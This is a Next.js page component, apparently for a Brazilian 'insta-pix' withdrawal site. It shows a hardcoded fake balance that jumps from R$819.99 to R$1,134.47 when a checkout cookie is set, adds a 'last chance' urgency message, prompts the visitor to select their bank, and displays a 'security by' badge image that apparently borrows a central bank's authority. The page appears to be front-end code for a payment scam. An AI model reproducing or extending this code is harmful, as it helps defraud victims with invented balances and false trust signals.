import Image from "next/image";
import Logo from '@/assets/insta-pix-logo.png'
import { FormPayment } from "./form-payment";
import { Header } from "@/components/header";
import BC from '@/assets/bc.png'
import { cookies } from 'next/headers'


export default function PagamentoPage() {

  const cookie = cookies().get('user_checkout')?.value

  const value = cookie ? 1134.47 : 819.99



  return (
    <>
      <div className="border-b border-zinc-500">
        <div className="w-full h-16 flex items-center justify-between p-5">
          <Image src={Logo} alt="Logo" width={0} height={0} className="w-[180px] h-auto object-contain" />
          <div className="relative border border-[#00bdae] rounded-lg flex items-center gap-1 py-1 px-4 text-black">
            <span className="absolute bg-white -top-2 left-2 px-1 text-[10px] font-semibold text-[#00bdae]">SALDO</span>
            <span className="text-black text-lg font-semibold">
              <span className='text-xs text-black font-semibold'>{new Intl.NumberFormat('pt-BR', {
                style: 'currency',
                currency: 'BRL'
              }).format(value)}</span>
            </span>
          </div>
        </div>
      </div>

      <Header />

      <div className="flex flex-col mt-[20px] p-5">

        {
          cookie === undefined ? (
            <div className='bg-white rounded-lg flex items-center justify-center gap-1 p-4 shadow-xl'>
              <span className='font-bold text-black'>Realize agora seu saque de {" "} {new Intl.NumberFormat('pt-BR', {
                style: 'currency',
                currency: 'BRL',
              }).format(Number(value))}</span>
            </div >
          ) : (
            <div className='bg-white rounded-lg flex items-center justify-center gap-1 p-4 shadow-xl'>
              <span className='font-bold text-center text-black animate-pulse'>O valor foi acumulado para{" "}{new Intl.NumberFormat('pt-BR', {
                style: 'currency',
                currency: 'BRL',
              }).format(Number(value))}, você tem a última chance de saque imediato.</span>
            </div >
          )
        }


        <div className='flex items-center justify-center mt-4'>
          <p className='text-xs font-semibold text-zinc-900'>Selecione seu banco abaixo:</p>
        </div>




        <FormPayment />


      </div >

      <div className="flex items-center justify-center flex-col pt-16 select-none space-y-1">
        <p className="text-sm text-white">
          Segurança pelo:
        </p>

        <Image src={BC} alt="bc" width={0} height={0} className="w-[200px] h-auto" />
      </div>

    </>
  )
}